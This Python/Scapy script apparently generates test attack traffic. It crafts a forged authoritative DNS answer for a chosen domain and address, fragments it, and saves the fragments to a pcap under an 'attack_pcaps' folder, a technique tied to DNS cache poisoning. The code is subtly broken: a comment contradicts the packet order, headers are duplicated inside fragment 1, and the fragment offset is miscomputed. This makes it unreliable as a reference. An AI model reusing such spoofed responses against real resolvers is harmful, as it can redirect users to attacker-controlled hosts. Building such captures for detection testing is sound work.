import argparse
from scapy.all import *

# Argument parsing
parser = argparse.ArgumentParser(description="Fragmented DNS response generator")
parser.add_argument("--dst", default="192.168.1.1", help="Destination IP (resolver IP)")
parser.add_argument("--pcap", default="../attack_pcaps/frag.pcap", help="Output PCAP file path")
parser.add_argument("--domain", default="example.com", help="Domain name for the DNS response")
parser.add_argument("--rdata", default="93.184.216.34", help="IP address for the DNS answer (A record)")
args = parser.parse_args()

# Create a DNS response
dns_response = IP(dst=args.dst)/UDP(dport=53)/DNS(
    id=12345,
    qr=1,  # This is a response
    opcode=0,  # Standard query
    aa=1,  # Authoritative Answer
    rd=0,  # Recursion Desired
    ra=0,  # Recursion Available
    z=0,  # Reserved
    rcode=0,  # No error condition
    qd=DNSQR(qname=args.domain, qtype="A"),
    an=DNSRR(rrname=args.domain, type="A", ttl=3600, rdata=args.rdata)
)

# Get the raw bytes of the DNS response
raw_response = raw(dns_response)

# Constants
MTU = 1500  # Maximum Transmission Unit
ip_header_size = 20  # Size of the IP header

# Calculate the size for the first fragment
frag1_size = MTU - ip_header_size  # Maximum size for first fragment payload

# Ensure frag1_size does not exceed the maximum size for an IP packet
if frag1_size > 65535:
    raise ValueError("Fragment size exceeds maximum packet size!")

# Split raw response into fragments
frag_payload1 = raw_response[:frag1_size]
frag_payload2 = raw_response[frag1_size:]

# Fragment 1: IP header + UDP header + DNS response part
fragment1 = Ether() / IP(dst=dns_response[IP].dst, id=dns_response[IP].id, flags="MF") / \
            UDP(dport=dns_response[UDP].dport, sport=dns_response[UDP].sport) / \
            Raw(frag_payload1)

# Fragment 2: IP header + remaining DNS response
fragment2 = Ether() / IP(dst=dns_response[IP].dst, id=dns_response[IP].id,
                         frag=len(frag_payload1) // 8) / \
            Raw(frag_payload2)


# Write packets to a pcap file in the correct order
packets = [fragment2, fragment1]  # First fragment is sent first
wrpcap(args.pcap, packets)